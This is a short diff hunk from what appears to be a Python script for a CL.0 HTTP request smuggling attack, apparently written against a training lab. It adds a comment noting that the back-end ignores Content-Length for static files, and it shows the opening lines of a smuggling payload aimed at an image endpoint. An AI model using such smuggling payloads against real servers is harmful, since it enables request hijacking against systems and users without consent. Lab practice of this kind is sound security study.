@@ -11,6 +11,8 @@ proxie = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 # CL.0 request smuggling attack function
 def CL_0(target_host, target_port):
     # Smuggling payload designed to send two requests in a single TCP connection
+    # the back-end egnore the content-length for the statcis file 
+
     payload_smuggling = (
         "POST /resources/images/avatarDefault.svg HTTP/1.1\r\n"  # Vulnerable static file endpoint
         f"Host: {target_host}\r\n"  # Host header for the target
